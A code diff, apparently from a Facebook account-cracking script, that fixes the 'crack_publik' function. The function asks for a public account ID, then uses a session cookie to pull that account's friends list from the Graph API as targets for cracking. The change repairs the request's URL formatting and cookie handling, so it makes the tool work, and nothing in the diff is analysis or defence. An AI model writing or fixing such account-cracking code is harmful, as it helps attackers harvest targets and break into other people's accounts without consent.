@@ -505,6 +505,7 @@ def get_komen(url):
 def crack_publik(t,c):
 
 	akun = input(f'[{hh}!{P}] MAKE SURE THE ACCOUNT IS PUBLIC\n[{hh}?{P}] ID : ')
+	uid.append(akun)
 	for user in uid:
 	    try:
 	       head = (
@@ -524,7 +525,7 @@ def crack_publik(t,c):
 	           'fields': "friends"
 	           }	           
 	       )
-		bas = ses.get('https://graph.facebook.com/{akun}'.format(user),params=params,headers=head,cookies={'cookies':coki}).json()
+		bas = ses.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':c}).json()
 		for pi in bas['friends']['data']:
 			try:
 				try:
